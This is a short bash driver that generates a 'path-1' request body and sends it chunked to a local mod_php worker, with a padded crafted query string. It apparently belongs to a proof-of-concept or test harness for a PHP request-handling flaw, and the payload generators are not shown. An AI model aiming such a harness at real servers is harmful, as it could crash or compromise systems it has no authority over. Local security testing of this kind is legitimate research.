#!/usr/bin/env bash
# Build and send the path-1 body to a single mod_php worker.
# usage: ./run_path1.sh [port] [body-out]
set -euo pipefail
PORT=${1:-8091}
OUT=${2:-/tmp/p1.bin}
DIR=$(cd "$(dirname "$0")" && pwd)
python3 "$DIR/path1_body.py" --out "$OUT"
V=$(printf 'v%.0s' $(seq 1 15))
P="/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
for i in $(seq 0 7); do P="$P&g$i=$V"; done
python3 "$DIR/chunked_send.py" --port "$PORT" --body-file "$OUT" --path "$P" --timeout 30
